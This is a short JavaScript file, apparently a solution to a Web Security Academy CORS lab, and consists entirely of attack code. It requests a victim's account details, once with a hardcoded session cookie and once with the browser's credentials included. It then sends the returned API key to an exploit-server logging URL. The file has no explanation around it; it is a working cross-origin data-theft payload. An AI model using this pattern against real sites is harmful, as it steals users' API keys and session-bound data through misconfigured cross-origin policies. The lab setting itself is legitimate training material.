fetch(
  "https://0a9200f4033ffc19804512d000440093.web-security-academy.net/accountDetails",
  {
    method: "GET",
    headers: {
      Cookie: "session=Le0vQyPsa19ZphE7AjpwpSmLqT7bMSXD;",
    },
  }
)
  .then((response) => response.json())
  .then((data) => {
    fetch(
      `https://exploit-0a58000003aafcc7808e11cb015b005b.exploit-server.net/log?key=${data.apikey}`
    );
    console.log(data.apikey);
  });

fetch(
  "https://0a9200f4033ffc19804512d000440093.web-security-academy.net/accountDetails",
  {
    method: "GET",
    credentials: "include",
  }
)
  .then((response) => response.json())
  .then((data) => {
    fetch(
      `https://exploit-0a58000003aafcc7808e11cb015b005b.exploit-server.net/log?key=${data.apikey}`
    );
  });
  //
